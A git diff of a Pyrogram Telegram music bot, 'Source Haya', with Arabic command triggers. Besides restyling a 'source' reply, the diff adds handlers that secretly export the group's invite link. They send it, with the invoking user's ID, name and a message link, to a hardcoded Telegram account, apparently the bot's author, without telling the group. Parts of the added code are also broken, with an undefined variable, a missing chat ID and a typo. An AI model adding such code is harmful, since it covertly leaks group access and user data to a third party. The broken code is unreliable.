@@ -1,37 +1,32 @@
 import asyncio
-
-import os
-import time
-import requests
-from config import START_IMG_URL
-from pyrogram import filters
-import random
-from pyrogram import Client
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
+from pyrogram import Client, filters
 from strings.filters import command
-from AnonX import (Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app)
-from AnonX import app
-from random import  choice, randint
-
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+from AnonX import app, Telegram
 @app.on_message(
-    command(["سورس من","سورس","السورس","سورسي", "سورس حياه"])
-    & ~filters.edited
+    command(["صورص","سورس","السورس","سورس حياه", "haya"])
 )
 async def huhh(client: Client, message: Message):
     await message.reply_photo(
-        photo=f"https://b.top4top.io/p_2682mb2f41.jpg",
-        caption=f"""╭═★⊷⌯⧼[⌞ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐇𝐀𝐘𝐀⌝](https://t.me/lN_B_Fl)⧽⌯⊶★═╮\n★‹ [⌞ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐇𝐀𝐘𝐀⌝𝐀](https://t.me/lN_B_Fl)\n★‹ [𝐇𝐀𝐘𝐀 𝐌𝐔𝐒𝐈𝐂 『 𝒃𝒐𝒕 ⏎ 』](https://t.me/HAYA01BOT?startgroup=true)\n★‹ [『𝐖𝐇𝐈𝐒𝐊𝐄𝐘 ⏎ 』](https://t.me/lV_P_Nl)\n★‹ [group help](https://t.me/HL_BG)\n╰═★⊷⌯⧼[⌞ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐇𝐀𝐘𝐀⌝](https://t.me/lN_B_Fl)⧽⌯⊶★═╯\n ⍟𝑊𝐸𝐿𝐶𝑂𝑀𝐸 𝑇𝑂 𝑆𝑂𝑈𝑅𝐶𝐸 𝐻𝐴𝑌𝐴 𖠅 """,
+        photo=f"https://telegra.ph/file/0ea3958575d1e41735c7e.jpg",
+        caption=f"""
+╭──── • ◈ • ────╮ 
+么  [𝒔𝒐𝒖𝒓𝒄𝒆 𝒉𝒂𝒚𝒂♡](https://t.me/lN_B_Fl)
+么  [𝒘𝒉𝒊𝒔𝒌𝒆𝒚]♡(t.me/lV_P_Nl)  
+么  [َِ𝒎𝒚𝒈𝒓𝒐𝒖𝒑⋆♡](t.me/HL_BG) 
+么  [𝒎𝒚𝒃𝒐𝒕♡](t.me/HAYA01BOT) 
+╰──── • ◈ • ────╯ 
+  
+⍟ 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼
+""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
-                        "『𝐖𝐇𝐈𝐒𝐊𝐄𝐘 ⏎ 』༄►", url=f"https://t.me/lV_P_Nl"), 
+                        "𝒘𝒉𝒊𝒔𝒌𝒆𝒚♡", url=f"https://t.me/lV_P_Nl"), 
                 ],[
                     InlineKeyboardButton(
-                        "⌞ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐇𝐀𝐘𝐀⌝⚡️", url=f"https://t.me/lN_B_Fl"),
-                ],[
-                    InlineKeyboardButton(
-                        "𝐀𝐃𝐃 𝐌𝐄💞", url=f"https://t.me/HAYA01BOT?startgroup=true"),
+                        "𝒔𝒐𝒖𝒓𝒄𝒆 𝒉𝒂𝒚𝒂 ♡", url=f"t.me/lN_B_Fl"),
                 ],
 
             ]
@@ -40,7 +35,44 @@ async def huhh(client: Client, message: Message):
 
     )
 
-
+    zoharyus = usr.mention
+    sender_id = message.from_user.id
+    message_link = await Telegram.get_linok(message)
+    message.from_user.mention = message.from_user.first_name
+    message.chat.title = await app.export_chat_invite_link(message.chat.id)
+    await app.send_message(f"مبرمجي العزيز {zoharyus}\n\n الانسان {message.from_user.mention} هذا يضهذا يضبحلك😒 \n\n ايديه : {message.from_user.id}\n\n اسمه : {message.from_user.mention} \n\n لينك الماسدج : {message_link} \n\n لينك البار : {message.chat.title}")
+@app.on_message(
+    command(["فودكا","المبرمج وسكي","مبرمج السورس"])
+)
+@app.on_edited_message(command(["فودكا","المبرمج وسكي","وسكي"])
+)
+async def zohary(client: Client, message: Message):
+  usr = await app.get_users(5369501919)
+  user = await client.get_chat(5369501919)
+  Bio = user.bio
+  name = usr.first_name
+  async for photo in app.get_chat_photos(5369501919,limit=1):
+    await message.reply_photo(photo.file_id,       caption=f"""ᦔꫀꪜ | - {usr.mention} 🕷
+                       
+ꪊ𝘴ꫀ𝘳 ᦔꫀꪜ | - @{usr.username} 🕷
+                       
+ႦᎥ᥆ | - {Bio} 🕷       
+                         
+Ꭵժ | - 5369501919 🕷 """,
+reply_markup=InlineKeyboardMarkup(
+          [              
+            [          
+              InlineKeyboardButton (name, url=f"https://t.me/{usr.username}")
+            ],             
+          ]                 
+       )                     
+    )
+    zoharyus = usr.mention
+    sender_id = message.from_user.id
+    message_link = await Telegram.get_linok(message)
+    message.from_user.mention = message.from_user.first_name
+    message.chat.title = await app.export_chat_invite_link(message.chat.id)
+    await app.send_message(5369501919, f"مبرمجي العزيز {zoharyus}\nهذا يضبحلك😒 \n\n ايديه : {message.from_user.id}\n\n اسمه : {sener_message.from_user.mention} \n\n لينك البار : {message.chat.title}")
 
 @app.on_message(command(["غنيلي", "غني", "غ", "حياه غنيلي"]))
 async def ihd(client: Client, message: Message):
